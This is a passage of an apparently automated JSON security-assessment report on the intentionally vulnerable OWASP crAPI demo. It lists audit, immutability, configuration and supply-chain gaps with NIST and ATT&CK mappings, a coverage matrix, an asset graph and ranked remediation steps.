          "CWE-732"
        ],
        "owasp_api": [
          "API8:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": []
    },
    {
      "id": "nonrep-af88acb6",
      "title": "Break-glass and emergency-action audit not designed",
      "goal": "non_repudiation",
      "tier": "auditability",
      "severity": "medium",
      "confidence": "high",
      "disposition": "gap",
      "summary": "Runbook lacks emergency-action procedure; no distinguishable audit stream for break-glass events.",
      "detail": "The rubric's break-glass pattern: emergency actions (break-glass\nauth, emergency policy override, emergency credential rotation,\nDR failover initiation) should produce a distinguishable audit\nstream routed to security-review independent of normal audit\nconsumption.\n\ncrAPI's runbook §10 enumerates only account-takeover response\n(which is essentially a procedure for accepting the failure\nbecause session-revocation is impossible per resil-776fc650).\nThere is no documented break-glass action, no emergency\ncredential rotation procedure, no DR failover initiation.\n\nSeverity is medium because the demo-intent makes break-glass\nformally unnecessary; for any production-adjacent deploy this\ncoupled with nonrep-7fad26d8 is the operational-posture gap\npreventing emergency response.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "runbook.md",
          "locator": "§10 Respond to user account takeover",
          "excerpt": "Cannot invalidate the attacker's session"
        }
      ],
      "recommendation": {
        "posture": "consider",
        "summary": "For non-demo deploys, add break-glass procedures and dedicated audit streams."
      },
      "mappings": {
        "nist": [
          "AU-3",
          "AU-12(1)",
          "AC-6(9)",
          "AC-6(10)",
          "IR-4"
        ],
        "attack": [],
        "cwe": [],
        "owasp_api": [
          "API9:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": []
    },
    {
      "id": "immut-e50364e4",
      "title": "Audit substrate is mutable — no append-only, WORM, or hash-chain",
      "goal": "immutability",
      "tier": "auditability",
      "severity": "high",
      "confidence": "high",
      "disposition": "gap",
      "summary": "When audit is introduced (nonrep-7fad26d8), substrate must enforce immutability; default would land in Postgres/Mongo.",
      "detail": "Per the active domain pack's required-immutable data classes,\naudit log entries must not change once written. crAPI has no\naudit log (nonrep-7fad26d8); the operational stdout streams that\nstand in for audit are written to per-container log files that\ndocker/k8s log drivers manage with rotation and no immutability\nguarantee.\n\nThe Immutability finding is the design-time concern: when audit\nis introduced per nonrep-7fad26d8, the storage substrate must\nenforce immutability. The rubric's \"Audit log written to a\nmutable RDS table or document collection; no append-only\nenforcement, no WORM substrate\" pattern applies directly to any\nnaïve audit implementation that lands in Postgres or Mongo\nalongside business data.\n\nSeverity is high per the rubric pattern. Combined with\nnonrep-7fad26d8 the merged finding carries both concerns;\nsynthesizer should merge.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "runbook.md",
          "locator": "§8",
          "excerpt": "Tamper-evidence on stored logs (currently none)"
        }
      ],
      "recommendation": {
        "posture": "required",
        "summary": "Ship audit to WORM substrate (object-lock S3, append-only Loki, or hash-chained Postgres audit-table)."
      },
      "mappings": {
        "nist": [
          "AU-9",
          "AU-9(2)",
          "AU-9(3)",
          "AU-11",
          "SI-7",
          "SI-7(8)"
        ],
        "attack": [
          "T1070"
        ],
        "cwe": [
          "CWE-117",
          "CWE-778"
        ],
        "owasp_api": [
          "API9:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": []
    },
    {
      "id": "immut-a6c69999",
      "title": "Backup immutability not addressed — no backups exist; ransomware resilience absent",
      "goal": "immutability",
      "tier": "auditability",
      "severity": "high",
      "confidence": "high",
      "disposition": "blocked",
      "summary": "Per rubric backups must be immutable; crAPI has no backups (avail-8ad04f0e).",
      "detail": "crAPI ships no backup or restore procedure for either Postgres or MongoDB\n(tech_plan §6: \"Backups: unspecified\"). The Immutability rubric requires\nthat any backup set be written to a medium that resists post-write\nmodification (e.g., S3 object-lock compliance mode, WORM tape). Because\nno backups exist at all, the immutability requirement is vacuously\nunmet and remains blocked on avail-8ad04f0e (introduce a backup\nprocedure). Once a backup mechanism is chosen, immutability must be\nco-designed: a mutable backup is no defence against ransomware that\ncan reach the backup destination.\n\nThis finding is synthesizer-minted (no backing per-specialist record);\nit was raised by the Immutability specialist to flag the gap for\ncross-reference with avail-8ad04f0e.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "tech_plan.md",
          "locator": "§6 Persistence and storage",
          "excerpt": "Backups: unspecified. No backup, restore, or PITR procedure ships"
        }
      ],
      "recommendation": {
        "posture": "required",
        "summary": "When backups introduced (avail-8ad04f0e), use S3 object-lock compliance mode, ≥30 days primary, ≥1 year monthlies."
      },
      "mappings": {
        "nist": [
          "CP-9",
          "CP-9(1)",
          "CP-9(8)",
          "MP-4",
          "SI-7"
        ],
        "attack": [
          "T1490"
        ],
        "cwe": [
          "CWE-1188"
        ],
        "owasp_api": [
          "API8:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": [
        "Backup procedure introduction per avail-8ad04f0e",
        "Choice of backup substrate"
      ]
    },
    {
      "id": "immut-79a844dd",
      "title": "Configuration spread across compose env, env-vars, mounted files, and hard-coded binary — no drift detection",
      "goal": "immutability",
      "tier": "auditability",
      "severity": "medium",
      "confidence": "high",
      "disposition": "gap",
      "summary": "ENABLE_LOG4J/SHELL flags, JWKS file, gateway basic-auth in binary; no declared baseline.",
      "detail": "The system's configuration surface is spread across:\n- compose env stanzas (postgres/mongo credentials, JWT_SECRET,\n  ENABLE_LOG4J, ENABLE_SHELL_INJECTION, LOG_LEVEL)\n- mounted files (services/identity/jwks.json, per-service certs)\n- hardcoded in service binaries (gateway-service basic-auth per\n  S-5)\n- container images themselves (the crAPI service images)\n\nThere is no declared baseline configuration (\"the\nproduction-intended state is X\"), no drift detection (\"the\nactual state diverged from declared by Y\"), no signed-commit\nrequirement on configuration changes.\n\nPer the rubric's \"Configuration is partly IaC, partly manual;\nno drift detection between declared and actual state\" pattern,\nseverity is medium when deploy parameters are manual; the\nENABLE_LOG4J/SHELL flags are in the medium-to-high band because\nflipping one silently activates a critical vulnerability per\nintg-8d97cd9f.\n\nFor the demo intent — operator-controlled, single-host —\ndrift detection is overkill. For any shared deploy this is the\noperational-posture gap.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "tech_plan.md",
          "locator": "§9 Implicit posture facts",
          "excerpt": "Postgres + Mongo creds are static literals in the compose file. JWT_SECRET=crapi shipped alongside the RS256 keys"
        }
      ],
      "recommendation": {
        "posture": "recommended",
        "summary": "Declare baseline in IaC (Helm values + compose with required overrides); add config-drift check."
      },
      "mappings": {
        "nist": [
          "CM-2",
          "CM-2(2)",
          "CM-3",
          "CM-3(1)",
          "CM-6",
          "CM-6(1)",
          "CM-6(2)"
        ],
        "attack": [],
        "cwe": [
          "CWE-1357"
        ],
        "owasp_api": [
          "API8:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": []
    },
    {
      "id": "immut-c97f668f",
      "title": "Configuration repository protected-branch / signed-commit posture unspecified",
      "goal": "immutability",
      "tier": "auditability",
      "severity": "medium",
      "confidence": "medium",
      "disposition": "blocked",
      "summary": "Project repo branch-protection and signed-commit settings not in input scope.",
      "detail": "The rubric's \"Configuration repository allows history rewrite —\nno protected branches, no force-push prevention, no\nsigned-commit requirement\" pattern applies to the upstream\nOWASP crAPI repository's commit-discipline posture. The input\nset does not include the upstream repo's branch-protection\nconfiguration.\n\nThe Immutability concern is on the supply-chain side: any\nconfiguration change to the upstream `deploy/docker/docker-compose.yml`\nor the `services/identity/jwks.json` must be attributable and\ntamper-resistant. Without protected branches and signed commits,\na maintainer-account compromise yields silent config change in\nthe published artifact.\n\nDisposition is `blocked` because the project-repo settings are\nnot in the gauntlet's scope. Severity is medium per the rubric.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "prior-audit.md",
          "locator": "§Source",
          "excerpt": "synthesised from the upstream OWASP crAPI documentation and the shipped artifacts"
        }
      ],
      "recommendation": {
        "posture": "consider",
        "summary": "Upstream recommendation: protected main, required signed commits, PR review for security paths."
      },
      "mappings": {
        "nist": [
          "CM-3",
          "CM-3(1)",
          "SI-7(8)",
          "SA-10",
          "SR-4"
        ],
        "attack": [],
        "cwe": [
          "CWE-345"
        ],
        "owasp_api": [
          "API8:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": [
        "GitHub repo branch-protection settings",
        "Signed-commit requirement status"
      ]
    },
    {
      "id": "immut-b74ae78a",
      "title": "No SBOM, no per-deployment artifact-provenance history",
      "goal": "immutability",
      "tier": "auditability",
      "severity": "medium",
      "confidence": "high",
      "disposition": "gap",
      "summary": "Upstream does not publish per-version SBOMs nor SLSA provenance; chain from running image to source commit unverifiable.",
      "detail": "Per the rubric's \"SBOM and artifact-provenance history not\nretained — only current SBOM stored\" pattern, the upstream\ncrAPI project does not appear to publish per-version SBOMs nor\na SLSA-level provenance attestation linking deployed image\ndigest to source-commit hash through the build pipeline.\n\nThe Immutability concern is the supply-chain attribution\nhorizon: when a deploy uses `crapi/crapi-identity:${VERSION}`,\nthe chain from running image to source commit is not\nverifiable. Combined with the unsigned-image gap\n(auth-04fcfb9a), an operator cannot prove provenance.\n\nSeverity is medium per the rubric. For the demo intent, this\nis acceptable; for any deploy that needs to demonstrate\nprovenance (compliance, vendor due-diligence), the gap is\nmaterial.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "tech_plan.md",
          "locator": "§2 Services",
          "excerpt": "crapi/crapi-identity:${VERSION}"
        }
      ],
      "recommendation": {
        "posture": "consider",
        "summary": "Upstream: publish SBOMs per release; integrate SLSA-3 build provenance."
      },
      "mappings": {
        "nist": [
          "SR-4",
          "SR-4(3)",
          "CM-8",
          "AU-11",
          "SR-11"
        ],
        "attack": [
          "T1195"
        ],
        "cwe": [],
        "owasp_api": [
          "API8:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": []
    },
    {
      "id": "immut-49cb874c",
      "title": "Cryptographic key lifecycle events not auditable",
      "goal": "immutability",
      "tier": "auditability",
      "severity": "medium",
      "confidence": "high",
      "disposition": "gap",
      "summary": "No record of jwks.json mutation or credential rotation; key-lifecycle events go unaudited.",
      "detail": "The rubric's required-immutable data classes include\n\"cryptographic key lifecycle events — key creation, rotation,\nrevocation, destruction\". crAPI ships no such audit. When an\noperator drops a replacement `jwks.json` per runbook §5,\nthere's no record of the change beyond the filesystem mtime.\nWhen datastore credentials are rotated per runbook §6, there's\nno record of the change beyond the env-var swap.\n\nCombined with ephem-30d38360 (no rotation procedure at all),\nthis is a chicken-and-egg: rotation is GAP so audit-of-rotation\nis moot; when rotation is added, audit emission must be part\nof the rotation script.\n\nSeverity is medium because the demo-intent bounds the\noperational impact; for any production-adjacent posture this\nis the audit-side of the rotation gap.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "runbook.md",
          "locator": "§5 Rotate the JWT signing key",
          "excerpt": "GAP. No documented procedure ships"
        }
      ],
      "recommendation": {
        "posture": "recommended",
        "summary": "When rotation tooling added, rotation scripts emit key-lifecycle audit events."
      },
      "mappings": {
        "nist": [
          "AU-3",
          "AU-12",
          "SC-12",
          "IA-5"
        ],
        "attack": [],
        "cwe": [
          "CWE-778"
        ],
        "owasp_api": [
          "API9:2023",
          "API8:2023"
        ],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": []
    },
    {
      "id": "immut-56949f0a",
      "title": "Retention policy for any data class is unspecified",
      "goal": "immutability",
      "tier": "auditability",
      "severity": "medium",
      "confidence": "high",
      "disposition": "blocked",
      "summary": "No per-data-class retention declared; rubric requires regulatory-anchored retention.",
      "detail": "Per the active domain pack's required-immutable data classes,\nretention should be declared per-data-class with regulatory\ncitation. crAPI's inputs are silent on retention for users,\norders, vehicles, mechanic_reports, audit (which doesn't exist\nper nonrep-7fad26d8), backups (which don't exist per\navail-8ad04f0e), or any other class.\n\nPer the rubric's \"Retention duration not specified in artifacts\"\npattern, disposition is `blocked` and the prerequisite is a\ndeclared retention policy keyed per the deploy's regulatory\nanchors. For the demo intent, no retention is appropriate; for\nany other deploy, the policy must be declared.\n\nSeverity is medium pending the deploy-intent prerequisite.\n",
      "rubric_clause": null,
      "evidence": [
        {
          "artifact": "tech_plan.md",
          "locator": "§10 Out-of-scope",
          "excerpt": "Operational hardening. crAPI does not target production deployment. No on-call posture, no SLO commitments, no key rotation, no log retention"
        }
      ],
      "recommendation": {
        "posture": "consider",
        "summary": "For non-demo deploys, declare per-data-class retention in tech_plan §11 with regulatory citation."
      },
      "mappings": {
        "nist": [
          "AU-11",
          "AU-11(1)",
          "SI-12"
        ],
        "attack": [],
        "cwe": [],
        "owasp_api": [],
        "owasp": [],
        "d3fend": []
      },
      "lens_perspectives": [],
      "prerequisite_evidence": [
        "Deploy intent and regulatory anchors",
        "Per-data-class retention table"
      ]
    }
  ],
  "contradictions": [],
  "contradictions_notes": "No specialist-to-specialist contradictions surfaced in this run. The\nintake brief established a shared baseline (no PHI scope; demo intent;\n18+ documented intentional vulnerabilities) that all 9 specialists\noperated against; merge candidates were folded into lens_perspectives\nrather than recorded as contradictions.\n\nThe closest candidate for a contradiction is the framing of the\nsingle-host topology: Distributed treats it as the canonical SPOF\n(high), while Availability writes the SLO-absent finding as blocked\n(medium). These are not contradictions because they cover different\nfacets of the same architectural decision and explicitly cite their\nrubric clauses; the synthesizer treats them as adjacent-lens findings\non a shared concern.\n\nCross-tier cross_references are resolved in deduped-findings.yaml\nwithout flagged dangling IDs.\n",
  "severity_disagreements": [],
  "severity_disagreements_notes": "No severity disagreements between specialists. Where two or more\nspecialists wrote findings on the same architectural concern, severity\nwas either consistent or the synthesizer escalated to the highest\ncited tier during merging (per rubric guidance, do not average across\nmultiple impacts). Examples:\n\n- merged-c829ffc8: conf-c66f08cf (critical), intg-15c04a1c\n  (critical), auth-09ae00ed (critical) — all critical, merged at\n  critical.\n- merged-d2e871f5: intg-078ee9f6 (high), auth-55e76c4d\n  (high), nonrep-fc423071 (high), ephem-b95a7d11 (high) — all\n  high, merged at high.\n- merged-514507e6: conf-cf457739 (high),\n  intg-5c659bdb (high), avail-6af5aff7 (high) — all high.\n- merged-44bdb663: conf-3e324699 (high),\n  dist-c047a7c0 (high) — both high.\n\nThe synthesizer notes the absence of disagreement is itself\nsignal: the inputs were sufficiently candid (especially\nprior-audit.md's carry-forward and threat-model.md's STRIDE\ncatalog) that severity calibration was anchored on the same\nrubric clauses across all 9 lenses.\n",
  "nist_rollup": [
    {
      "family": "AU",
      "title": "Audit & Accountability",
      "covered": 0,
      "gapped": 20,
      "both": 2,
      "notable": "AU-12, AU-3, AU-11 cited"
    },
    {
      "family": "SC",
      "title": "System & Communications Protection",
      "covered": 0,
      "gapped": 10,
      "both": 11,
      "notable": "SC-5, SC-7, SC-12 cited"
    },
    {
      "family": "AC",
      "title": "Access Control",
      "covered": 0,
      "gapped": 14,
      "both": 3,
      "notable": "AC-3, AC-6, AC-4 cited"
    },
    {
      "family": "IA",
      "title": "Identification & Authentication",
      "covered": 0,
      "gapped": 10,
      "both": 3,
      "notable": "IA-5, IA-2, IA-5(1) cited"
    },
    {
      "family": "CM",
      "title": "Configuration Management",
      "covered": 0,
      "gapped": 10,
      "both": 1,
      "notable": "CM-2, CM-3, CM-5 cited"
    },
    {
      "family": "CP",
      "title": "Contingency Planning",
      "covered": 0,
      "gapped": 8,
      "both": 3,
      "notable": "CP-13, CP-12, CP-2 cited"
    },
    {
      "family": "SI",
      "title": "System & Information Integrity",
      "covered": 0,
      "gapped": 8,
      "both": 3,
      "notable": "SI-10, SI-13, SI-7 cited"
    },
    {
      "family": "SR",
      "title": "Supply Chain Risk Management",
      "covered": 0,
      "gapped": 4,
      "both": 0,
      "notable": "SR-4, SR-11, SR-4(3) cited"
    },
    {
      "family": "SA",
      "title": "System & Services Acquisition",
      "covered": 0,
      "gapped": 2,
      "both": 0,
      "notable": "SA-10, SA-15(7) cited"
    },
    {
      "family": "MP",
      "title": "Media Protection",
      "covered": 0,
      "gapped": 1,
      "both": 0,
      "notable": "MP-4 cited"
    }
  ],
  "attack_exposure": [
    {
      "id": "T1190",
      "name": "Exploit Public-Facing Application",
      "findings": 6,
      "mitigations": [
        "intg-cap-4212a616"
      ],
      "coverage": "partial",
      "note": ""
    },
    {
      "id": "T1078",
      "name": "Valid Accounts",
      "findings": 4,
      "mitigations": [],
      "coverage": "uncovered",
      "note": ""
    },
    {
      "id": "T1213",
      "name": "Data from Information Repositories",
      "findings": 4,
      "mitigations": [],
      "coverage": "uncovered",
      "note": ""
    },
    {
      "id": "T1552.001",
      "name": "Credentials in Files",
      "findings": 4,
      "mitigations": [],
      "coverage": "uncovered",
      "note": ""
    },
    {
      "id": "T1110.001",
      "name": "Password Guessing",
      "findings": 2,
      "mitigations": [
        "intg-cap-c6f2bf49",
        "avail-cap-5af461f2"
      ],
      "coverage": "partial",
      "note": ""
    },
    {
      "id": "T1550.001",
      "name": "Application Access Token",
      "findings": 2,
      "mitigations": [],
      "coverage": "uncovered",
      "note": ""
    },
    {
      "id": "T1070",
      "name": "Indicator Removal",
      "findings": 1,
      "mitigations": [],
      "coverage": "uncovered",
      "note": ""
    },
    {
      "id": "T1195.002",
      "name": "Software Supply Chain",
      "findings": 1,
      "mitigations": [],
      "coverage": "uncovered",
      "note": ""
    },
    {
      "id": "T1490",
      "name": "Inhibit System Recovery",
      "findings": 1,
      "mitigations": [],
      "coverage": "uncovered",
      "note": ""
    },
    {
      "id": "T1499.003",
      "name": "Application Exhaustion Flood",
      "findings": 1,
      "mitigations": [
        "avail-cap-26d2f293"
      ],
      "coverage": "partial",
      "note": ""
    },
    {
      "id": "T1557",
      "name": "Adversary-in-the-Middle",
      "findings": 1,
      "mitigations": [],
      "coverage": "uncovered",
      "note": ""
    },
    {
      "id": "T1562.008",
      "name": "Disable or Modify Cloud Logs",
      "findings": 1,
      "mitigations": [],
      "coverage": "uncovered",
      "note": ""
    },
    {
      "id": "T1606",
      "name": "Forge Web Credentials",
      "findings": 1,
      "mitigations": [
        "auth-cap-125067f9"
      ],
      "coverage": "partial",
      "note": ""
    }
  ],
  "apd_matrix": {
    "goals": [
      "conf",
      "intg",
      "avail",
      "dist",
      "resil",
      "ephem",
      "auth",
      "nonrep",
      "immut"
    ],
    "goalLabels": {
      "conf": "Conf",
      "intg": "Intg",
      "avail": "Avail",
      "dist": "Dist",
      "resil": "Resil",
      "ephem": "Ephem",
      "auth": "Auth",
      "nonrep": "NonRep",
      "immut": "Immut"
    },
    "rows": [
      {
        "component": "adrs/0001-microservice-split-by-language.md",
        "cells": {
          "conf": "covered",
          "intg": "covered",
          "avail": "both",
          "dist": "both",
          "resil": "covered",
          "ephem": "covered",
          "auth": "covered",
          "nonrep": "covered",
          "immut": "covered"
        }
      },
      {
        "component": "adrs/0003-mailhog-for-otp-delivery.md",
        "cells": {
          "conf": "both",
          "intg": "covered",
          "avail": "both",
          "dist": "covered",
          "resil": "covered",
          "ephem": "covered",
          "auth": "covered",
          "nonrep": "both",
          "immut": "covered"
        }
      },
      {
        "component": "adrs/0004-dual-datastore-postgres-and-mongo.md",
        "cells": {
          "conf": "covered",
          "intg": "both",
          "avail": "covered",
          "dist": "covered",
          "resil": "covered",
          "ephem": "covered",
          "auth": "covered",
          "nonrep": "covered",
          "immut": "covered"
        }
      },
      {
        "component": "agents.md",
        "cells": {
          "conf": "covered",
          "intg": "covered",
          "avail": "both",
          "dist": "both",
          "resil": "covered",
          "ephem": "covered",
          "auth": "covered",
          "nonrep": "covered",
          "immut": "covered"
        }
      },
      {
        "component": "architecture-index.md",
        "cells": {
          "conf": "both",
          "intg": "both",
          "avail": "both",
          "dist": "both",
          "resil": "covered",
          "ephem": "covered",
          "auth": "covered",
          "nonrep": "covered",
          "immut": "covered"
        }
      },
      {
        "component": "invariants.md",
        "cells": {
          "conf": "covered",
          "intg": "both",
          "avail": "covered",
          "dist": "covered",
          "resil": "covered",
          "ephem": "covered",
          "auth": "covered",
          "nonrep": "covered",
          "immut": "covered"
        }
      },
      {
        "component": "prior-audit.md",
        "cells": {
          "conf": "covered",
          "intg": "covered",
          "avail": "covered",
          "dist": "both",
          "resil": "covered",
          "ephem": "covered",
          "auth": "covered",
          "nonrep": "covered",
          "immut": "both"
        }
      },
      {
        "component": "runbook.md",
        "cells": {
          "conf": "covered",
          "intg": "covered",
          "avail": "both",
          "dist": "covered",
          "resil": "both",
          "ephem": "both",
          "auth": "covered",
          "nonrep": "both",
          "immut": "both"
        }
      },
      {
        "component": "tech_plan.md",
        "cells": {
          "conf": "both",
          "intg": "both",
          "avail": "both",
          "dist": "both",
          "resil": "both",
          "ephem": "both",
          "auth": "both",
          "nonrep": "covered",
          "immut": "both"
        }
      },
      {
        "component": "threat-model.md",
        "cells": {
          "conf": "covered",
          "intg": "both",
          "avail": "both",
          "dist": "covered",
          "resil": "covered",
          "ephem": "both",
          "auth": "covered",
          "nonrep": "covered",
          "immut": "covered"
        }
      }
    ]
  },
  "attack_paths": {
    "mermaid": "graph TD\n  asset-a1b2c3d4[\"crapi-identity\"]\n  asset-a3b4c5d6[\"API_USER/API_PASSWORD (chatbot admin credential)\"]\n  asset-a7b8c9d0[\"mongodb\"]\n  asset-b2c3d4e5[\"crapi-workshop\"]\n  asset-b8c9d0e1[\"chromadb\"]\n  asset-c3d4e5f6[\"crapi-community\"]\n  asset-c9d0e1f2[\"mailhog\"]\n  asset-d0e1f2a3[\"api.mypremiumdealership.com\"]\n  asset-d4e5f6a7[\"crapi-chatbot\"]\n  asset-e1f2a3b4[\"services/identity/jwks.json (private key)\"]\n  asset-e5f6a7b8[\"crapi-web\"]\n  asset-f2a3b4c5[\"JWT_SECRET env var\"]\n  asset-f6a7b8c9[\"postgresdb\"]\n  atk-264bde5f((\"internal_lateral_attacker\"))\n  atk-2a628eed((\"authenticated_user_seeking_authz_bypass\"))\n  atk-3f205280((\"compromised_admin_session\"))\n  atk-404a3c86((\"unauthenticated_internet\"))\n  atk-43ba1c0a((\"supply_chain_attacker\"))\n  atk-5331accf((\"compromised_user_session_token\"))\n  atk-5ec33a11((\"compromised_oauth_client_credentials\"))\n  atk-82a39ff7((\"authenticated_low_priv_user_with_bola_target\"))\n  atk-a3d36625((\"compromised_third_party_integration\"))\n  jewel-10ff98db{{\"session_token_signing_keys\"}}\n  jewel-168c256c{{\"backup_artifact_store\"}}\n  jewel-277b3f04{{\"third_party_integration_secrets\"}}\n  jewel-3257f37f{{\"pii_profile_store\"}}\n  jewel-47b02c84{{\"payment_methods_store\"}}\n  jewel-4da600e8{{\"audit_log_store\"}}\n  jewel-61f49a34{{\"authorization_decision_engine\"}}\n  jewel-681465d8{{\"user_credentials_store\"}}\n  asset-d0e1f2a3 --> asset-a1b2c3d4\n  asset-d0e1f2a3 --> asset-d4e5f6a7\n  asset-c9d0e1f2 --> asset-a1b2c3d4\n  asset-a1b2c3d4 --> asset-c9d0e1f2\n  asset-a7b8c9d0 --> asset-f6a7b8c9\n  asset-a1b2c3d4 --> asset-e5f6a7b8\n  asset-a1b2c3d4 --> asset-e5f6a7b8\n  asset-f6a7b8c9 --> asset-a7b8c9d0\n  asset-f6a7b8c9 --> asset-a7b8c9d0\n  asset-f6a7b8c9 --> asset-a7b8c9d0\n  asset-e5f6a7b8 --> asset-d0e1f2a3\n  asset-a1b2c3d4 --> asset-d0e1f2a3\n  asset-a7b8c9d0 --> asset-b8c9d0e1\n  asset-f6a7b8c9 --> asset-a7b8c9d0\n  asset-b8c9d0e1 --> asset-d0e1f2a3\n  asset-d0e1f2a3 --> asset-e5f6a7b8\n  asset-f6a7b8c9 --> asset-b8c9d0e1\n  asset-d4e5f6a7 --> asset-d0e1f2a3\n  asset-e5f6a7b8 --> asset-a1b2c3d4",
    "mermaid_path_focused": null,
    "pairs": [],
    "bottleneck_overlays": [],
    "bottleneck_threshold": 5,
    "max_edge_traversal_count": 0,
    "summary": {
      "total_paths": 0,
      "total_pairs": 0,
      "bottleneck_count": 0
    },
    "asset_graph_summary": {
      "node_count": 30,
      "edge_count": 19,
      "attacker_position_count": 9,
      "crown_jewel_count": 8,
      "asset_count": 13,
      "identity_count": 0,
      "trust_boundary_edge_count": 12,
      "finding_derived_edge_count": 5,
      "capability_derived_edge_count": 2
    },
    "pairs_empty_explanation": "No (attacker, crown-jewel) paths were enumerated for this run. The asset graph has 30 nodes / 19 edges but those edges don't form a chain from any declared attacker position to any declared crown jewel. This is common for runs where finding evidence references documents (e.g., tech_plan.md) rather than specific asset names — the analyzer can't synthesize edges from prose. To enable path enumeration, enrich 00-context/asset-inventory.yaml with explicit trust boundaries connecting attacker positions to crown jewels, OR have specialists tag finding evidence with the asset_id of the affected component."
  },
  "next_steps": [
    {
      "rank": 1,
      "text": "Generate a fresh per-install JWKS, pin alg:RS256 in every verifier, remove JWT_SECRET, and allowlist jku — single highest-leverage fix; closes the cluster-wide forge-any-identity capability.",
      "refs": [
        "merged-c829ffc8",
        "ephem-30d38360",
        "dist-0a56c5f0"
      ]
    },
    {
      "rank": 2,
      "text": "Add MFA (TOTP for users, WebAuthn step-up for admin) on every authentication surface; bring AAL target into tech_plan.md.",
      "refs": [
        "auth-0925a719",
        "auth-b57f022f",
        "auth-c990b0ff"
      ]
    },
    {
      "rank": 3,
      "text": "Apply allowlist serializers + server-side validation to /shop/orders (quantity ≥ 1, server-derived unit_price), /user/videos/{id} (strip internal fields), and any user-update path (strip role).",
      "refs": [
        "intg-e7ebcc95",
        "intg-62ebf664",
        "intg-a6b6d147",
        "intg-6d98c520"
      ]
    },
    {
      "rank": 4,
      "text": "Parameterize every SQL/Mongo query path — apply_coupon (parameterized UPDATE) and validate-coupon (typed-struct unmarshal); add CI lint to fail on string-concatenated SQL.",
      "refs": [
        "intg-2aeb03f1",
        "intg-b7417f91",
        "intg-ab3edc7a"
      ]
    },
    {
      "rank": 5,
      "text": "Remove the chatbot's embedded admin credential; chatbot acts under the prompt author's bearer token with a tool-call allowlist per user role.",
      "refs": [
        "merged-d2e871f5"
      ]
    },
    {
      "rank": 6,
      "text": "Add typed URL allowlist + IP-resolution check + per-token rate limit + drop response body on /contact_mechanic outbound fetch.",
      "refs": [
        "merged-514507e6"
      ]
    },
    {
      "rank": 7,
      "text": "Provision per-service Postgres+Mongo users with collection-scoped grants; remove static credentials from compose; rotate per-deploy.",
      "refs": [
        "merged-44bdb663",
        "ephem-22c2358c"
      ]
    },
    {
      "rank": 8,
      "text": "Define an audit-event schema, emit per consequential action with actor attribution, ship to a separate WORM-substrate sink (S3 object-lock).",
      "refs": [
        "nonrep-7fad26d8",
        "immut-e50364e4",
        "nonrep-fa2c351c",
        "nonrep-304b32af"
      ]
    },
    {
      "rank": 9,
      "text": "Drop JWT TTL to 1 hour; introduce refresh-token rotation with reuse-detection; expose /logout backed by a JTI deny-list.",
      "refs": [
        "resil-776fc650",
        "ephem-96d3befb"
      ]
    },
    {
      "rank": 10,
      "text": "Apply uniform rate limits across every check-otp variant, forget-password, and login; increase OTP entropy to ≥6 digits.",
      "refs": [
        "avail-e96ad7ff",
        "avail-c1ffcf8e"
      ]
    }
  ],
  "taxonomy": {
    "AC-12": {
      "family": "NIST 800-53r5",
      "title": "Session Termination"
    },
    "AC-12(1)": {
      "family": "NIST 800-53r5",
      "title": "Session Termination | User-initiated Logouts"
    },
    "AC-2": {
      "family": "NIST 800-53r5",
      "title": "Account Management"
    },
    "AC-2(2)": {
      "family": "NIST 800-53r5",
      "title": "Account Management | Automated Temporary and Emergency Account Management"
    },
    "AC-2(3)": {
      "family": "NIST 800-53r5",
      "title": "Account Management | Disable Accounts"
    },
    "AC-3": {
      "family": "NIST 800-53r5",
      "title": "Access Enforcement"
    },
    "AC-3(7)": {
      "family": "NIST 800-53r5",
      "title": "Access Enforcement | Role-based Access Control"
    },
    "AC-4": {
      "family": "NIST 800-53r5",
      "title": "Information Flow Enforcement"
    },
    "AC-4(8)": {
      "family": "NIST 800-53r5",
      "title": "Information Flow Enforcement | Security and Privacy Policy Filters"
    },
    "AC-5": {
      "family": "NIST 800-53r5",
      "title": "Separation of Duties"
    },
    "AC-6": {
      "family": "NIST 800-53r5",
      "title": "Least Privilege"
    },
    "AC-6(1)": {
      "family": "NIST 800-53r5",
      "title": "Least Privilege | Authorize Access to Security Functions"
    },
    "AC-6(10)": {
      "family": "NIST 800-53r5",
      "title": "Least Privilege | Prohibit Non-privileged Users from Executing Privileged Functions"
    },
    "AC-6(5)": {
      "family": "NIST 800-53r5",
      "title": "Least Privilege | Privileged Accounts"
    },
    "AC-6(7)": {
      "family": "NIST 800-53r5",
      "title": "Least Privilege | Review of User Privileges"
    },
    "AC-6(9)": {
      "family": "NIST 800-53r5",
      "title": "Least Privilege | Log Use of Privileged Functions"
    },
    "AC-7": {
      "family": "NIST 800-53r5",
      "title": "Unsuccessful Logon Attempts"
    },
    "AC-7(2)": {
      "family": "NIST 800-53r5",
      "title": "Unsuccessful Logon Attempts | Purge or Wipe Mobile Device"
    },
    "AU-10": {
      "family": "NIST 800-53r5",
      "title": "Non-repudiation"
    },
    "AU-10(1)": {
      "family": "NIST 800-53r5",
      "title": "Non-repudiation | Association of Identities"
    },
    "AU-11": {
      "family": "NIST 800-53r5",
      "title": "Audit Record Retention"
    },
    "AU-11(1)": {
      "family": "NIST 800-53r5",
      "title": "Audit Record Retention | Long-term Retrieval Capability"
    },
    "AU-12": {
      "family": "NIST 800-53r5",
      "title": "Audit Record Generation"
    },
    "AU-12(1)": {
      "family": "NIST 800-53r5",
      "title": "Audit Record Generation | System-wide and Time-correlated Audit Trail"
    },
    "AU-2": {
